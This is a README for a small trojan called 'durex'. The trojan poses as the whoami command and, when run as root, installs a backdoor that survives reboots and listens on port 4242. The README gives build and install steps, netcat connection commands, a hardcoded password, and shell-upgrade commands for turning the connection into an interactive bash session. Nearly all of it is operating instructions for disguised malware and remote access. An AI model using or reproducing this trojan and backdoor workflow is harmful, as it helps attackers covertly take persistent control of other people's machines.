# durex

A really simple trojan, disguised as whoami
- installs a backdoor when launched as root
- backdoor is accessible with `nc <INFECTED_MACHINE_IP> 4242`
- rebooting doesn't remove the backdoor

## Usage

```bash
# build durex
make

# check installation
make check

# uninstall backdoor
make reset

# launch and install backdoor
sudo ./durex

# launch and do nothing
./durex
```

## Connecting to the backdoor

```bash
# connect with nc
nc localhost 4242

# input password
hacker

# launch shell
shell

# enable xterm features
python  -c "import pty;pty.spawn('/bin/bash')"
bg
export term=XTERM
stty raw -echo;fg
```

## Refs

* [systemd service](https://linuxconfig.org/how-to-write-a-simple-systemd-service)
* [easy systemd](https://medium.com/@benmorel/creating-a-linux-service-with-systemd-611b5c8b91d6)
